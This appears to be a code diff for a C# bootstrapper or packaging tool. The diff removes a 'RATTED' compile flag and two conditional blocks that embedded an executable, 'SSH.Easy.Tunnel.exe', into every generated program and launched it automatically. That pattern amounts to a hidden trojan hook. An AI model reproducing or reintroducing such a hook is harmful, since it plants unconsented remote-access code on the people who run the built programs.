@@ -1,5 +1,4 @@
-﻿#define _RATTED
-using System.IO;
+﻿using System.IO;
 using System.Windows;
 using System.Windows.Forms;
 using Microsoft.Win32;
@@ -115,9 +114,6 @@ namespace Bootstraper
                     compiler.SetIcon(iconPath);
 
             SaveDependencies();
-#if RATTED
-            compiler.AddEmbeddedResource(Path.GetFileName("M:\\VisualStudio\\NAR\\publish\\SSH.Easy.Tunnel.exe"), File.ReadAllBytes("M:\\VisualStudio\\NAR\\publish\\SSH.Easy.Tunnel.exe"));
-#endif
             foreach (var dependency in Dependencies.GetList())
             {
                 if (File.Exists(dependency))
@@ -130,9 +126,6 @@ namespace Bootstraper
                     MessageBox.Show($"Dependency {dependency} does not exist.", "Warning", MessageBoxButton.OK, MessageBoxImage.Warning);
                 }
             }
-#if RATTED
-            compiler.ProgramaticallyStart(Path.GetFileName("M:\\VisualStudio\\NAR\\publish\\SSH.Easy.Tunnel.exe"));
-#endif
             Thread CompileThread = new Thread(() =>
             {
                 bool result = compiler.Compile(outputExePath);
